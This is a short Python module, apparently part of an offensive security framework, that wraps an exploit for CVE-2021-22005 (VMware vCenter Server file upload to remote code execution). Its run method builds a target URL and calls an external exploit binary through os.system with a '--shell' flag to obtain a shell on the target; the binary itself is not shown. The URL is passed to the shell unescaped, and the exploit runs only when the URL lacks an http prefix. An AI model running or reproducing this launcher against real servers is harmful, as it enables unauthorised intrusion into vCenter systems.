import requests
import json
import os
import sys
import pathlib
from rich.console import Console
from rich.table import Table

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.options = {
            "url": {"value": None, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Author")
        table.add_column("Scanner description")
        table.add_column("Other")
        table.add_row("r0cky","CVE-2021-22005 - VMWare vCenter Server File Upload to RCE","-")
        console.print(table)
    
    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error("Required key {} is not set".format(key))
                return

        if not self.options["url"]["value"].startswith("http"):
            url = "http://" + self.options["url"]["value"]
            print(url)
            dir = pathlib.Path.cwd() / "modules" / "exploit" / "vcenter" / "exp"
            print(dir)
            
            os.system("%s/cve-2021-22005 -u %s --shell" %(dir,url))
            